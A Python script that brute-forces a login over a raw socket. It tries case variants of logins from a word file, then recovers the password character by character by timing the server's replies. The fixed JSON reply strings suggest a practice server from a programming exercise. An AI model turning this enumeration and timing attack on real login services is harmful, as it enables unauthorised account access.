import argparse
import socket
import itertools
import json
import string
from datetime import datetime

parser = argparse.ArgumentParser(description='Create a socket connection')
parser.add_argument('ip', type=str, help='The server IP address')
parser.add_argument('port', type=int, help='Port the server will listen on')
args = parser.parse_args()


def establish_connection(ip, port):
    sock = socket.socket()
    sock.connect((ip, port))

    with open('/home/muhurijson/Desktop/logins.txt', 'r') as logins_dict:
        login_lines = logins_dict.readlines()

        def load_logins(lines):
            for line in lines:
                line = line.strip('\n')
                yield list(map(''.join, itertools.product(*((char.upper(), char.lower()) for char in line))))

        logins = load_logins(login_lines)
        all_logins = []
        for i in logins:
            for login in i:
                all_logins.append(login)

        wrong_login_response = {
            "result": "Wrong login!"
            }
        wrong_password_response = {
            'result': 'Wrong password!'
            }
        connection_success_response = {
            "result": "Connection success!"
            }
        for login in all_logins:
            data = {
                "login": login,
                "password": " "
            }
            sock.send(json.dumps(data).encode())
            response = json.loads(sock.recv(1024).decode())
            if response == wrong_login_response:
                continue
            elif response == wrong_password_response:
                user_login = login
                break
        pass_found = False
        login_password = ""
        while not pass_found:
            for char in string.ascii_letters + string.digits:
                data = {
                    "login": user_login,
                    "password": login_password + char
                    }
                try:
                    start_time = datetime.now()
                    sock.send(json.dumps(data).encode())
                    response = json.loads(sock.recv(1024).decode())
                    finish_time = datetime.now()
                    response_time = finish_time - start_time

                    if response == connection_success_response:
                        login_password += char
                        login_deets = {"login": user_login, "password": login_password}
                        print(json.dumps(login_deets, indent=4))
                        pass_found = True
                        break
                    elif response == wrong_password_response:
                        if response_time.total_seconds() >= 0.010000:
                            login_password += char
                        else:
                            continue
                except Exception:
                    pass

    sock.close()


if __name__ == '__main__':
    establish_connection(args.ip, args.port)
